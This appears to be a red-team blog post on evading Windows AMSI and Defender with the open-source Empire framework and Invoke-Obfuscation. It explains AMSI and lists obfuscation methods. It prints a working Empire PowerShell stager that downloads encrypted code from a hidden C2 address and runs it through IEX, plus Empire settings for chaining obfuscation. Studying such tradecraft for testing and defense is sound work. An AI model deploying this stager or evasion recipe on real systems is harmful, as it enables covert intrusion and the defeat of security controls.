---
title: RedTeam Exercises with OpenSource Tools
author: WHmacmac
layout: post
permalink: RedTeam_Exercises_with_OpenSource_Tools_Part_1
category: blog
---

Can RedTeam exercises be done today only using open source tools and do they have 100% yield/success? Can I affirm that I can compete with the top solutions in a red team vs blue team engagement, blackbox or whitebox exercise, using only open source tools and having the same result as the enterprise solutions like: Canvas, Metasploit Pro, Open Core, Cobaltstrike ?

In the series that I will approach, I will present ways to compete with the top security research undertaken by companies focused on security products and how we can combine and customize multiple open source sollutions for achieving the same result. 


## Contents
* [Short Introduction](#shortintro)
* [What is AMSI?](#whatisamsi)
* [How do I make use of opensource](#howdoimakeuseofopensource)
* [Code Obfuscation](#codeobfuscation)
* [Invoke Obfuscation](#invokeobfuscation)

## Short Introduction {#shortintro}
Because it is less probable to encounter a Linux based system with a security solution in an enterprise environment, I have chosen to focus on how we can compromise a Windows based system up to date (11.04.2020 - the date I am writing this article) having all of the security modules enabled.

We can see a number of measures implemented in Microsoft's operating system that have no role other than to provide a greater protection system for user protection:
<ul>
  <li>Windows Defender</li>
  <li>Antimalware Scan Interface (AMSI)</li>
  <li>Control flow guard</li>
  <li>Data Execution Prevention (DEP)</li>
  <li>Randomized memory allocations</li>
  <li>Arbitrary Code guard (ACG)</li>
  <li>Block child processes</li>
  <li>Simulated Execution (SimExec)</li>
  <li>Valid stack integrity (StackPivot)</li>
</ul>          
I do not want to advertise Microsoft products but as I focus on proving we still can bypass their sollutions, I can not say that they didn't do a good job regarding thier security solutions (maybe they are intending to sell security services like many others if they already have not started). One security sollution from Microsoft I encountered more than I intended to, and I burned my arsenal in development or pentests before finding out what stopped me and why, I am pretty sure you encountered it too even if Windows Defender was not the main AV/AntiMalware solution from your target. I think you got about what i am speaking of :).
                    

## What is AMSI? {#whatisamsi}
As you guessed, I was reffering at AMSI; before starting how to make use of the open source tools for a red team exercise, we have to bypass Microsoft's security modules, this meaning we have to bypass AMSI too. 
Before getting into the methods of bypassing AMSI, we need to clarify a little about what AMSI is, under what principles AMSI works and how it has the ability to catch even the most exotic payloads.

<div>
<center><img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools/amsi.png">
 </center>
</div>

AMSI is an interface that allows to the OS's applications and services to integrate with any antimalware product that's present on a machine. It supports a calling structure allowing for a file and memoy or stream scanning, content source URL/IP reputation checks and other techniques. It supports also the notion of a session so different antimalware vendors can correlate different scan requests, this being pretty bad for our stagers if they are catched by AMSI.
  
As we can see in the above image, AMSI is integrated by default in the following Windows' components meaning that for example we have a powershell script containing some commands, they will be analyzed based on some string patterns and in case they something match, then Windows Defender/ Microsoft's Sandbox will enter in action:

<ul>
  <li>User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)</li>
   <li>PowerShell (scripts, interactive use, and dynamic code evaluation)</li>
   <li>Windows Script Host (wscript.exe and cscript.exe)</li>
   <li>JavaScript and VBScript</li>
   <li>Office VBA macros</li>
</ul>
                    
As things were not enough bad, Microsoft improve the logging capabilities of Windows Defender so we have the risk to alarm the whole network of our presence if there is a SOC team.

<div>
<center><img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools/amsi_detection.png">
 </center>
</div>

{% highlight powershell %}
> Get-WinEvent ‘Microsoft-Windows-Windows Defender/Operational’ -MaxEvents 1 | Where-Object Id -eq 1116 | format-list

{% endhighlight %}

As we can see Windows Defender already logged our activity of trying to execute our payload in memory. As source of detection is menitoned AMSI. This can be easily automated in a SIEM to trigger an alert and all of our efforts of getting on the workstation would be useless.

AMSI may provide a result between 1 and 32767. The larger the result, the riskier it is to continue with the content. These values are provider specific, and may indicate a malware family or ID. Any return result equal to or larger than 32768 is considered malware,  and the result is blocked. A list from Microsoft docs will explain each range of values what means:
<ul>
  <li>AMSI_RESULT_CLEAN  - Known good. No detection found, and the result is likely not going to change after a future definition update.</li>
   <li>AMSI_RESULT_NOT_DETECTED - No detection found, but the result might change after a future definition update.</li>
   <li>AMSI_RESULT_BLOCKED_BY_ADMIN_START - Administrator policy blocked this content on this machine (beginning of range).</li>
   <li>AMSI_RESULT_BLOCKED_BY_ADMIN_END - Administrator policy blocked this content on this machine (end of range).</li>
   <li>AMSI_RESULT_DETECTED - Detection found. The content is considered malware  and should be blocked.</li>
</ul>

According to Microsoft docs “results within the range of AMSI_RESULT_BLOCKED_BY_ADMIN_START and AMSI_RESULT_BLOCKED_BY_ADMIN_END values (inclusive) are officially blocked by the admin specified policy. In these cases, the script in question will be blocked from executing. The range is large to accommodate future additions in functionality”.

This looks bad until now but courage, there is hope :).


## How do I make use of open source? {#howdoimakeuseofopensource}
As a penetration tester, I have to prioriteze what I want to complete first for having a prepared arsenal for any penetration test. Because time is precious to every one of us, we have to move fast: 
<ol>
<li>Get a working base code first from Empire, Metasploit, etc., would be ideally instead of reinventing the whell (reinventing the whell is a good thing if you are a malware developer - but this is a story for other article :) ).</li>
<li>Customize functions - change default parameters/functions names, delete comments, write the functionality in other way, etc.</li>  
<li>Obfuscate code.</li>  
<li>Test against AV - Make sure you disable the option for permitting to Microsoft to upload your sample in their cloud sandbox. This will just waste your precious payload.</li>  
</ol>

So this being said, i have chosen to go on the BC SECURITY's solution, the reborn Empire (epic music should be played on at this phrase).

<b>Why Empire and not other solution?</b><br/>
At this moment Empire is a robust and mature framework for post-exploitation, the guys from <a href="https://www.bc-security.org/post/the-empire-3-0-strikes-back" target="_blank" rel="noopener noreferrer">BC-Security </a> really did a good job after they forked the official unsupported project. I personally, when it comes to chose a platform, i prefer a solution that can be easily used by my team mates/ eventually colaborate all together on it through an API/ web interface. Empire has both API and web interface for multiple user colaboration.<br/>
Few pros why i have chosen Empire and you should go for it too, in case you are the clasic guy who works with classic tools:
<ul>
<li>Encrypted C2 channels and multiple protocols/services supported for communications.</li>
  <li>Adaptable modules: .bat, .vbs, .ddl, etc.</li>
  <li>Alot of evasion capabilities enabled by default.</li>
</ul>

Even if a lot of research articles are mention that powershell for redteams is no longer used by APTs as main tool of exploitation, i do not see their point. Powershell for redteams is a great tool if you are using it just for a legit pentest and nothing more:
<ul>
  <li>Operated in memory.</li>
  <li>Installed by default on Windows systems</li>
  <li>Full .NET access.</li>
  <li>Direct access to Win32 API.</li>
  <li>Admins typically leave it enabled.</li>
  </ul>

Below is a scheme of how Empire stager is deployed.
<div>
<center><img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools/stager.png">
 </center>
</div>
Okay so we completed the first step. I have chosen a base code to use as our main tool of attack. However default Empire will get me caught. It can not pass the AMSI protection of Windows system so obfuscation or changes are needed.


## Code Obfuscation {#codeobfuscation}
Because we have chosen powershell as our main programming language for malware developing, I will present few ways of how can we can obfuscate our code.

<b>1.Randomized Capitalization</b><br/>
Powershell is ignoring capitalization. Every antivirus/antimalware solution is heavily dependent upon signatures, this including signatures based on hashes.
<div>
<img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools/write-host.png">
</div>
Even if AMSI is ignoring capitalization, changing the payload's hash is a good practice.

<br/><b>2.Concatenation</b><br/>
AMSI is still heavily dependent upon signatures, however simple concatenation can prevent most alerts. Microsoft has implemented a custom EICAR string 'amsicontext' for testing the AMSI's detection capabilities.
<div>
<center><img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools/concat.png">
 </center>
</div>

<br/><b>3.Variable Insertion</b><br/>
Powershell recognizes $ as a special character in a string and will fetch the associated variable.
<div>
<img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools/insertion.png">
</div>

<br/><b>4.Format String</b><br/>
Powershell allows for the use of {} inside a string to allow for variable insertion. This is an reference to the format string function.
<div>
<center><img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools/formatstring.png">
 </center>
</div>

As you can see, AMSI is still not perfect in detecting all of above examples, maybe in time it will can. The list of obfuscation methods can continue from compressing the code to encrypting it, etc.<br/>
Also a good tip, is to break large section of code into smaller pieces and test them in part in order to determine what is being flagged in your stager when you develop the obfuscation.
<br/> However I promised that we will make use of multiple open source tools for achieving our goal and not losing to much time on development.

A script will come in play in our aid when it comes obfuscation, so lets Invoke-Obfuscation!

## Invoke-Obfuscation {#invokeobfuscation}
If you have not already viewed Daniel Bohannon's presentations about <a href="https://github.com/danielbohannon/Invoke-Obfuscation" target="_blank" rel="noopener noreferrer">Invoke-Obfuscation </a>, I invite you to take a look at the following <a href="https://www.youtube.com/watch?v=uE8IAxM_BhE" target="_blank" rel="noopener noreferrer">presentation1 </a> or <a href="https://www.youtube.com/watch?v=k5ToL0J7uL0" target="_blank" rel="noopener noreferrer">presentation2 </a>.

<div>
<center><img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools/invo1.png">
 </center>
</div>

"ScriptPath" is setting the path for reading the content from a file, in my case will be "/tmp/test.ps1", where test.ps1 is containing the following code:

{% highlight powershell %}
$ErrorActionPreference = "SilentlyContinue";$ebDd=NEW-ObjecT SySteM.NET.WeBCLiEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$ser=$([TEXt.ENCODInG]::UNICoDe.GeTStRiNG([ConVert]::FrOmBaSe64STRIng('aAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQA2ADAALgAxADMANAA6ADgAMAA=')));$t='/news.php';$EbdD.HeADErS.ADD('User-Agent',$u);$EBdD.ProXy=[SySTem.Net.WebREqUEst]::DeFaulTWEbPrOXy;$EBdD.PrOXY.CredEnTIALs = [SYsTem.NET.CredenTIAlCACHe]::DeFauLtNetWoRKCreDenTIAls;$Script:Proxy = $ebdd.Proxy;$K=[SySTeM.Text.ENcOdiNG]::ASCII.GEtBytEs('*VWR/g_v[59+~38qlKjd6(hcws|#ON0B');$R={$D,$K=$ARgS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COUNt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxOR$S[($S[$I]+$S[$H])%256]}};$eBdd.HEadErS.ADD("Cookie","bBxqmHhF=Xw9FMjBYWNyNHKSPRXrSEYxLcPA=");$DAtA=$ebDD.DOWnlOAdDaTA($ser+$T);$IV=$daTA[0..3];$DAtA=$DATA[4..$DAtA.LENGth];-joiN[CHAr[]](& $R $dATA ($IV+$K))|IEX

{% endhighlight %}

Without entering in to many details about it, lets see a little about its obfuscation techniques:

<b>1.Token obfuscation</b><br/>
The most used obfuscation method in our days is based on token, in special Empire is coming with Token/ALL obfuscation as default. If you chose to go for the Token/ALL, it will do a long set of changes like variable insertation, concatenation, comments removing, variable renaming, inserting random whitespace, etc. It is extremly useful for masking variable names to AMSI.
<div>
<center><img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools/token.png">
 </center>
</div>
However beucase it was extremely used in the last years, this will get you caught.
It is recommended to run whitespace last (at least 2-3 times).

<br/><b>2.Abstract Syntax Tree (AST) obfuscation</b><br/>
An <a href="https://cobbr.io/AbstractSyntaxTree-Based-PowerShell-Obfuscation.html" target="_blank" rel="noopener noreferrer"> AbstractSyntaxTree ('AST') </a> is a commonly used structure to represent and parse source code in both compiled and interepreted languages. PowerShell is unique in that it exposes the AST structure in a way that is friendly to developers and is <a href="https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.language?view=pscore-6.2.0" target="_blank" rel="noopener noreferrer">documented extensively </a>. 
  
AST at base can easily find language elements. It is breaking the structure of the code and it is linking structures of code; AMSI will look at each structure of code in part and the token obfuscation will not help us to bypass it because they will be reduced at the basic form. AST contains all parsed content in Powershell code without having to dive into text parsing (we want to hide from this).

<div>
<center><img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools/ast.png">
 </center>
</div>

The AST obfuscation method will change the structure of AST.

<br/><b>3.Encoding Obfuscation</b><br/>
It is used to mask the payload by converting the format in Hex, ASCI, Binary, AES encrypted, etc. Beware because Powershell interpreter has a limit of 8191 characters so carefull how much encoding you do. This will works fine with the compressing method in case you apply multiple encoding methods recursively.
<div>
<center><img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools/encoding.png">
 </center>
</div>


<br/><b>4.String Obfuscation</b><br/>
Obfuscated Powershell code as a string.<br/>
Breaks up the code with reversing techniques and concatenation.
<div>
<center><img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools/string.png">
 </center>
</div>

<b>5.Compress Obfuscation</b><br/>

<div>
<center><img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools/compress.png">
 </center>
</div>

<br/>Compress obfuscation can be used in conjunction with Encoding to reduce the overall size of the payload.
<div>
<center><img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools/compressrate.png">
 </center>
</div>

<br/><b>6.Obfuscate Command Args</b><br/>
Many pentesters are underestimated the Launcher obfuscation in their malware development phases. In the below image we can what methods of launcher obfuscation are available for us. 
<div>
<center><img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools/launcher.png">
 </center>
</div>
As we can see many of them are including "somethingbla IEX". Microsoft learnt from the past and any input passed to the IEX command will be verified by the AMSI or Windows Defender. This can be problematic because it can ruin all of our obfuscation efforts. Below is a proof of AMSI detection of a malicious variable passed to IEX. I recommend using WMIC instead of IEX if it is possible. 
<div>
<center><img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools/proof.png">
 </center>
</div>
Empire already includes a launcher based on IEX. At this moment the community/I do not know a replacement for IEX. Maybe there is but Microsoft did not document all of these little tricks because they do not wanna let the APTs to take advantage of it.

<br/><b>Conclusions</b><br/>
Empire has integrated Invoke Obfuscation in its stager's console.<br/>
Mix them up to avoid detection.<br/>
Example: 
<ol>
<li>Token\String\1,2</li>
<li>Whitespace\1</li>  
<li>Encoding\1</li>  
<li>Compress\1</li>  
</ol>

Example of how to use multiple obfuscation methods in Empire:
{% highlight powershell %}
set Obfuscate True
set ObfuscateCommand Token\String\1,1,2, Token\Variable\1, Token\Whitespace\1,1, Compress\1

{% endhighlight %}

<br/> In the next article, we will see how to apply all what we discussed to bypass Windows Defender, AMSI and get a reverse shell. We will approach few scenaries in what will follow.<br/>
Please let me know your feedback about it :).<br/><br/><br/>

References:<br/>
https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal<br/>
https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-antivirus/troubleshoot-windows-defender-antivirus<br/>
https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps<br/>
https://docs.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result<br/>
https://www.bc-security.org/post/the-empire-3-0-strikes-back<br/>
https://github.com/BC-SECURITY/Empire<br/>
https://docs.microsoft.com/en-us/windows/win32/api/amsi/<br/>
https://threatvector.cylance.com/en_us/home/how-to-implement-anti-malware-scanning-interface-provider.html<br/>
https://www.bc-security.org/post/the-empire-3-0-strikes-back<br/>
https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/<br/>
https://www.cyberark.com/threat-research-blog/amsi-bypass-patching-technique/<br/>
